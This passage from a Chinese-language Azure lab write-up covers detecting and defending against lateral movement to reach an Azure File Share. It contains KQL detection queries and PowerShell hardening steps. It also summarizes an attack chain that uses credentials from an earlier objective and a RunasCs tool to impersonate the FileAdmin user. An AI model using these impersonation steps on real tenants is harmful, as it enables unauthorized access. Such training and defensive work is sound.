│  • 设备: 学生 VM (未加入 Entra ID)                                   │
│  • 用户: FileAdmin ✅                                                │
│  • 设备信任: ❌                                                       │
│  • 结果: 访问被拒绝 (403 Forbidden)                                  │
│                                                                     │
│  场景 B: 从 Entra Joined 设备访问 ✅                                │
│  ──────────────────────────────────────────                          │
│  • 设备: Entra Joined Server (FILESVC01)                            │
│  • 用户: FileAdmin ✅                                                │
│  • 设备信任: ✅                                                       │
│  • 结果: 访问成功 ✅                                                 │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 检测与防御

> 参考资料：[IdentitySecurityMonitoring.md](IdentitySecurityMonitoring.md) - 身份安全监控
> 参考资料：[LateralMovementADEID.md](LateralMovementADEID.md) - 防止横向移动的最佳实践

### 检测方法

#### 1. 异常登录行为检测

**检测逻辑**: 监控从非预期位置或设备对 Azure Files 的访问

```kusto
// KQL 查询 - 适用于 Microsoft Sentinel / Microsoft Defender XDR
// 检测异常的 Azure Files 访问行为

// 检测文件位置: queries/AADConnect-SignInsOutsideServerIP.kql
let StorageAccountIPs = dynamic([
    "192.168.2.62",  // 预期的 Entra Joined 服务器 IP
    // 添加其他预期的 IP 地址
]);

SigninLogs
| where TimeGenerated > ago(1d)
| where AppId == "00000003-0000-0ff1-ce00-000000000000"  // Office 365 Exchange Online
    or AppId == "00000002-0000-0ff1-ce00-000000000000"  // SharePoint
| where ResourceDisplayName contains "storage" or ResourceDisplayName contains "file"
| where IPAddress !in (StorageAccountIPs)
| project
    TimeGenerated,
    UserPrincipalName,
    IPAddress,
    Location,
    DeviceDetail,
    AppDisplayName,
    ResourceDisplayName,
    ConditionalAccessStatus,
    RiskDetail,
    RiskLevelDuringSignIn
| order by TimeGenerated desc
```

**检测文件位置**: [queries/AADConnect-SignInsOutsideServerIP.kql](queries/AADConnect-SignInsOutsideServerIP.kql)

#### 2. 横向移动检测

**检测逻辑**: 检测到同一用户在短时间内从不同设备登录

```kusto
// 检测文件位置: queries/AADConnectorAccount-OutsideOfWatchList.kql

// 识别从非预期位置的登录
AADServicePrincipalSignInLogs
| where TimeGenerated > ago(14d)
| where AppId == "<Your_Storage_Account_AppId>"
| project
    TimeGenerated,
    ServicePrincipalName,
    AppId,
    IPAddress,
    Location,
    DeviceId,
    Result
| join kind=leftouter (
    // 预期的设备/位置列表
    datatable(IPAddress:string, Expected:bool)
        ["192.168.2.62", true,
         "203.0.113.0", true]
) on IPAddress
| where isnull(Expected) or Expected == false
| project
    TimeGenerated,
    ServicePrincipalName,
    IPAddress,
    Location,
    Reason = "Outside of expected IP range"
```

**检测文件位置**: [queries/AADConnectorAccount-OutsideOfWatchList.kql](queries/AADConnectorAccount-OutsideOfWatchList.kql)

#### 3. 文件访问异常检测

**检测逻辑**: 监控对敏感文件共享的访问模式

```kusto
// 检测异常的文件共享访问

AzureActivity
| where TimeGenerated > ago(1d)
| where OperationNameValue == "Microsoft.Storage/storageAccounts/fileServices/fileshares/files/read"
    or OperationNameValue == "Microsoft.Storage/storageAccounts/listKeys/action"
| project
    TimeGenerated,
    Caller,
    CallerIpAddress,
    OperationName,
    ResourceGroupName,
    SubscriptionId
| summarize
    AccessCount = count(),
    AccessedFiles = dcount(ResourceId)
    by Caller, bin(TimeGenerated, 1h)
| where AccessCount > 100 or AccessedFiles > 50
| project
    TimeGenerated,
    Caller,
    AccessCount,
    AccessedFiles,
    Severity = case(
        AccessCount > 1000, "High",
        AccessCount > 100, "Medium",
        "Low"
    )
```

#### 4. 多阶段事件关联

**检测逻辑**: 关联多个检测信号以识别复杂攻击链

```kusto
// 检测文件位置: queries/MDA-Hunt-Multi-Stage-Incident.kql

// 关联横向移动和文件访问
let LateralMovementEvents = materialize(
    SigninLogs
    | where TimeGenerated > ago(7d)
    | where DeviceDetail.operatingSystem == "Windows Server"
    | where IPAddress == "192.168.2.62"
    | project TimeGenerated, UserPrincipalName, IPAddress, DeviceId
);

let FileAccessEvents = materialize(
    AzureActivity
    | where TimeGenerated > ago(7d)
    | where OperationNameValue contains "Microsoft.Storage/storageAccounts/fileServices"
    | project TimeGenerated, Caller, CallerIpAddress, OperationName
);

LateralMovementEvents
| join kind=inner (
    FileAccessEvents
) on $left.UserPrincipalName == $right.Caller
| where TimeGenerated1 > TimeGenerated  // 文件访问发生在登录之后
| where datetime_diff('minute', TimeGenerated, TimeGenerated1) < 60  // 1 小时内
| project
    LoginTime = TimeGenerated,
    UserPrincipalName,
    AccessTime = TimeGenerated1,
    OperationName,
    TimeDiff = datetime_diff('minute', TimeGenerated, TimeGenerated1)
```

**检测文件位置**: [queries/MDA-Hunt-Multi-Stage-Incident.kql](queries/MDA-Hunt-Multi-Stage-Incident.kql)

### 防御措施

#### 1. 实施条件访问策略

> 参考资料：[LateralMovementADEID.md](LateralMovementADEID.md#configure-an-admin-conditional-access-policy)

**要求**：
- 要求合规或 Entra hybrid joined 设备
- 对敏感操作要求 MFA
- 限制从特定位置访问

```powershell
# 配置条件访问策略 - 要求合规设备
Connect-MgGraph -Scopes "Policy.ReadWrite.ConditionalAccess"

$params = @{
    displayName = "Require compliant device for Azure Files access"
    state = "enabled"
    conditions = @{
        applications = @{
            includeApplications = @("00000003-0000-0ff1-ce00-000000000000")
        }
        users = @{
            includeUsers = @("all")
        }
    }
    grantControls = @{
        operator = "OR"
        builtInControls = @("compliantDevice", "domainJoinedDevice")
    }
}

New-MgIdentityConditionalAccessPolicy -BodyParameter $params
```

#### 2. 网络分段

**隔离敏感资源**：
```
┌─────────────────────────────────────────────────────────────────────┐
│              网络分段策略                                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  管理/可信子网 (192.168.2.0/24)                                     │
│  ┌───────────────────────────────────────────────────────────┐    │
│  │  • Entra Joined 服务器                                      │    │
│  │  • 管理员工作站                                             │    │
│  │  • 只能从特定 IP 访问                                        │    │
│  │  • 要求 MFA + 合规设备                                       │    │
│  └───────────────────────────────────────────────────────────┘    │
│                                                                     │
│  一般用户子网                                                       │
│  ┌───────────────────────────────────────────────────────────┐    │
│  │  • 学生 VM                                                 │    │
│  │  • 受限的网络访问                                          │    │
│  │  • 无法直接访问管理资源                                     │    │
│  └───────────────────────────────────────────────────────────┘    │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

#### 3. 存储账户防火墙

**配置存储账户网络规则**：

```powershell
# 启用存储账户防火墙
$storageAccountName = "plantinformation"
$resourceGroupName = "PlantInfo-RG"

# 配置默认拒绝访问
Update-AzStorageAccountNetworkRuleSet `
    -ResourceGroupName $resourceGroupName `
    -Name $storageAccountName `
    -DefaultAction Deny

# 添加允许的 IP (Entra Joined 服务器)
Add-AzStorageAccountNetworkRule `
    -ResourceGroupName $resourceGroupName `
    -Name $storageAccountName `
    -IPAddressOrRange "192.168.2.62"

# 允许受信任的 Microsoft 服务
Add-AzStorageAccountNetworkRule `
    -ResourceGroupName $resourceGroupName `
    -Name $storageAccountName `
    -Bypass AzureServices
```

#### 4. 监控和审计

**启用诊断日志**：

```powershell
# 为存储账户启用诊断日志
$storageAccount = Get-AzStorageAccount -Name $storageAccountName -ResourceGroupName $resourceGroupName

# 配置日志发送到 Log Analytics
Set-AzDiagnosticSetting `
    -ResourceId $storageAccount.Id `
    -WorkspaceId "/subscriptions/.../workspaces/LogAnalyticsWorkspace" `
    -Enabled $true `
    -Categories @("StorageRead", "StorageWrite", "StorageDelete")
```

**配置安全警报**：

```powershell
# 使用安全配置分析器
# 参考: AADSecurityConfigAnalyzer.md

# 检测异常访问模式
$alertRule = @{
    name = "Suspicious Azure Files Access"
    description = "Detects unusual access patterns to Azure File Shares"
    severity = "High"
    query = @"
        AzureActivity
        | where Category == "Storage"
        | where OperationName contains "file"
        | where CallerIPAddress !in (allowed_ips)
        | project TimeGenerated, Caller, CallerIPAddress, OperationName
    "@
}
```

#### 5. 实施 Just-In-Time 访问

**使用 Azure Bastion**：
```
┌─────────────────────────────────────────────────────────────────────┐
│              JIT 访问流程                                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  传统方式 (存在风险):                                               │
│  管理员 ──> 直接 RDP ──> 服务器                                     │
│  (24/7 开放，任何知道凭据的人都可以访问)                              │
│                                                                     │
│  JIT 方式 (更安全):                                                 │
│  管理员 ──> 请求访问 ──> 审批 ──> 临时开放端口 ──> Azure Bastion ──> 服务器 │
│  (只在需要时开放，自动关闭)                                           │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 参考资料

### 项目内文档

| 文档 | 位置 | 相关内容 |
|------|------|----------|
| 横向移动防护 | [LateralMovementADEID.md](LateralMovementADEID.md) | AD 攻陷后的防护策略 |
| 身份安全监控 | [IdentitySecurityMonitoring.md](IdentitySecurityMonitoring.md) | 监控与检测框架 |
| ABAC 权限控制 | [target3.md](target3.md) | Azure Storage ABAC 机制 |
| 令牌窃取攻击 | [target12.md](target12.md) | 端点令牌窃取技术 |

### 检测规则与查询

| 规则文件 | 位置 | 检测目标 |
|----------|------|----------|
| 异常登录检测 | [queries/AADConnect-SignInsOutsideServerIP.kql](queries/AADConnect-SignInsOutsideServerIP.kql) | 检测异常位置登录 |
| 连接账户监控 | [queries/AADConnectorAccount-OutsideOfWatchList.kql](queries/AADConnectorAccount-OutsideOfWatchList.kql) | 监控同步账户异常 |
| 多阶段事件关联 | [queries/MDA-Hunt-Multi-Stage-Incident.kql](queries/MDA-Hunt-Multi-Stage-Incident.kql) | 关联攻击链事件 |
| 用户活动追踪 | [queries/AiTM/HuntUserActivities.kql](queries/AiTM/HuntUserActivities.kql) | 追踪用户行为 |

### 配置文件

| 文件 | 位置 | 用途 |
|------|------|------|
| 安全配置基线 | [config/AadSecConfigV3.json](config/AadSecConfigV3.json) | Entra ID 安全配置 |
| 权限授予策略 | [config/permissionGrantPolicies.json](config/permissionGrantPolicies.json) | 权限授予配置 |
| 规则模板 | [config/ruletemplates/](config/ruletemplates/) | 检测规则模板 |

### 外部参考资料

#### 官方文档

| 主题 | URL |
|------|-----|
| Azure Files 基于身份验证 | [Overview of Azure Files identity-based authentication](https://learn.microsoft.com/en-us/azure/storage/files/storage-files-active-directory-overview) |
| Azure AD Kerberos | [Enable Azure Active Directory Kerberos authentication for hybrid identities](https://learn.microsoft.com/en-us/azure/storage/files/storage-files-identity-auth-hybrid-identities-enable) |
| 设备身份 | [What is a device identity?](https://learn.microsoft.com/en-us/entra/identity/devices/overview) |
| 条件访问 | [Conditional Access overview](https://learn.microsoft.com/en-us/entra/identity/conditional-access/overview) |
| 存储账户安全 | [Azure Storage security best practices](https://learn.microsoft.com/en-us/azure/storage/common/storage-security-best-practices) |

#### 安全研究

| 主题 | 来源 |
|------|------|
| Kerberos 委派攻击 | [SpecterOps - Kerberos Attacks](https://specterops.io/) |
| Azure 存储安全 | [SecureCloud.blog](https://securecloud.blog/) |
| AADInternals 工具 | [AADInternals.com](https://aadinternals.com) |
| 横向移动技术 | [MITRE ATT&CK - Lateral Movement](https://attack.mitre.org/tactics/TA0008/) |

---

## 总结

### 攻击链回顾

```
┌─────────────────────────────────────────────────────────────────────┐
│                    完整攻击链总结                                    │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  起点: Objective 12 获取 FileAdmin 凭据                              │
│       ↓                                                             │
│  侦察: 发现存储账户配置为 AADKERB                                    │
│       ↓                                                             │
│  受阻: 从学生 VM 直接访问失败 (设备不受信任)                          │
│       ↓                                                             │
│  Objective 13: [本文档重点]                                          │
│       ├── 横向移动到 Entra Joined 服务器 (192.168.2.62)               │
│       ├── 验证设备信任状态 (AzureAdJoined : YES)                      │
│       ├── 使用 RunAs 技术模拟 FileAdmin 用户                         │
│       └── 成功访问 Azure File Share (SMB + Kerberos)                 │
│       ↓                                                             │
│  终点: 读取 Flag 文件，完成实验目标                                   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 关键安全教训

1. **设备信任是关键**: 即使有正确的用户凭据，如果设备不受信任，访问也会被拒绝
2. **Kerberos 提供强认证**: AADKERB 要求用户 + 设备双重验证
3. **横向移动是常见攻击**: 攻击者会寻找受信任的设备作为跳板
4. **网络隔离很重要**: 存储账户防火墙可以限制访问来源

### 防御优先级

| 优先级 | 措施 | 影响 | 实施难度 |
|--------|------|------|----------|
| **高** | 配置存储账户防火墙 | 直接限制访问来源 | 低 |
| **高** | 实施条件访问策略 | 要求合规设备 | 中 |
| **高** | 启用网络分段 | 隔离敏感资源 | 中 |
| **中** | 部署异常访问检测规则 | 快速发现异常 | 中 |
| **中** | 实施 JIT 访问 | 减少攻击面 | 高 |

### 下一步学习

完成本实验后，建议继续学习：
- **[LateralMovementADEID.md](LateralMovementADEID.md)**: 防止横向移动的全面指南
- **[IdentitySecurityMonitoring.md](IdentitySecurityMonitoring.md)**: 建立全面的安全监控
- **[AADSecurityConfigAnalyzer.md](AADSecurityConfigAnalyzer.md)**: 使用工具评估安全配置

---

## 附录：快速参考

### A. 常用 PowerShell 命令

```powershell
# 检查设备加入状态
dsregcmd /status

# 测试 WinRM 连接
Test-WSMan -ComputerName <IP>

# 建立 PowerShell 会话
$session = New-PSSession -ComputerName <IP> -Credential $creds

# 查询存储账户配置
Get-AzStorageAccount | Select-Object -ExpandProperty AzureFilesIdentityBasedAuth

# 查看 RBAC 角色分配
Get-AzRoleAssignment -SignInName <UserUPN>
```

### B. 关键文件位置

```
工具目录:
C:\AzAD\Tools\Invoke-RunasCs.ps1

Entra Joined 设备:
\\192.168.2.62\c$\Users\Public\

Azure File Share 路径:
\\plantinformation.file.core.windows.net\plantinfoshare
```

### C. 应急响应检查清单

- [ ] 检查是否有从非预期位置的登录
- [ ] 验证所有 Entra Joined 设备的信任状态
- [ ] 审查存储账户的访问日志
- [ ] 检查横向移动迹象
- [ ] 验证条件访问策略是否生效
- [ ] 测试存储账户防火墙规则

### D. Kerberos 故障排除

| 问题 | 可能原因 | 解决方法 |
|------|----------|----------|
| 访问被拒绝 (403) | 设备未加入 Entra ID | 检查 `dsregcmd /status` |
| 无法获取票据 | 时钟不同步 | 同步系统时间 |
| 认证超时 | 网络连接问题 | 检查防火墙规则 |
| 权限不足 | RBAC 配置错误 | 验证角色分配 |

---

> **文档版本历史**
> - v2.0 (2025-01): 基于项目资料全面优化，增加理论基础、防御措施和参考资料
> - v1.0 (初始版): 基于 Lab Manual PDF 的基础实验步骤
